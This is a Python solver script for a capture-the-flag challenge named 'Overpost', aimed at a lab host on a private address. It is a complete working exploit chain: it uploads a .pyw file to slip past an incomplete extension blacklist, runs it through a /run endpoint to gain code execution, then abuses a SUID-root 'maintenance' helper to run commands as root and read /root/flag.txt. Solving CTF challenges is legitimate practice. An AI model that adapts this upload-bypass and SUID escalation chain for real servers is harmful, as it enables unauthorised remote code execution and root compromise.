#!/usr/bin/env python3
"""
Overpost challenge solver — Cyber Hero CTF 2026 (Red Team)
Target: http://192.168.30.133:8005  (usage: python3 solver.py [host[:port]])

Attack chain:
  1. Upload policy blacklist is incomplete: blocks .py .sh .php .cgi .pl .rb,
     but .pyw (Python-for-Windows script) is not blocked and is still executed
     by GET /run/<name> with the Python interpreter.
  2. Running our .pyw gives code execution as user 'overpost'.
  3. /usr/local/bin/maintenance is a SUID-root binary accepting
     '-p -c "<cmd>"' -> runs arbitrary commands with euid=0 (root).
  4. Read /root/flag.txt and print the flag.
"""
import json
import re
import sys
import uuid
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.30.133:8005"
BASE = f"http://{TARGET}"
UPLOAD_NAME = "solver_bypass.pyw"

# Payload uploaded to the portal and executed via /run/. It pivots through the
# SUID 'maintenance' helper to read the root-only flag.
PAYLOAD = """import subprocess
print(subprocess.run(
    ["/usr/local/bin/maintenance", "-p", "-c",
     "id; echo '---'; cat /root/flag.txt"],
    capture_output=True, text=True).stdout)
"""


def multipart_body(name: str, content: str):
    boundary = uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{name}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"{content}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    return body, f"multipart/form-data; boundary={boundary}"


def main() -> int:
    print(f"[*] Target: {BASE}")

    # Step 0 — fingerprint the service
    with urllib.request.urlopen(f"{BASE}/", timeout=10) as r:
        info = json.loads(r.read())
    print(f"[*] Service: {info['service']} - policy: {info['policy']}")

    # Step 1 — upload extension-blacklist bypass (.pyw is not in the policy)
    body, ctype = multipart_body(UPLOAD_NAME, PAYLOAD)
    req = urllib.request.Request(
        f"{BASE}/upload", data=body,
        headers={"Content-Type": ctype}, method="POST")
    with urllib.request.urlopen(req, timeout=15) as r:
        up = json.loads(r.read())
    print(f"[+] Upload response: {json.dumps(up)}")

    # Step 2 — execute the uploaded file through the /run endpoint
    with urllib.request.urlopen(f"{BASE}/run/{UPLOAD_NAME}", timeout=30) as r:
        res = json.loads(r.read())
    print("[+] Execution output:")
    print(res.get("output", ""))

    # Step 3 — extract the flag
    m = re.search(r"CYBERHEROCTF\{[^}]+\}", res.get("output", ""))
    if not m:
        print("[-] Flag not found in output")
        return 1
    print(f"[FLAG] {m.group(0)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

